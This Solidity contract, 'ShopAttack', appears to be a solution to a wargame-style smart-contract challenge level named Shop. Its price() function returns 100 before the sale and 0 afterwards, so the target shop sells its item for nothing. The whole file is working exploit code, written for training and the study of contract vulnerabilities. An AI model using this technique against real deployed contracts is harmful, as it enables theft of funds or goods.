pragma solidity ^0.6.0;

import '../levels/Shop.sol';

contract ShopAttack is Buyer {

    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function buy() public {
        shop.buy();
    }

    function price() external view override returns (uint) {
        if (!shop.isSold())
            return 100;
        else
            return 0;
    }

}
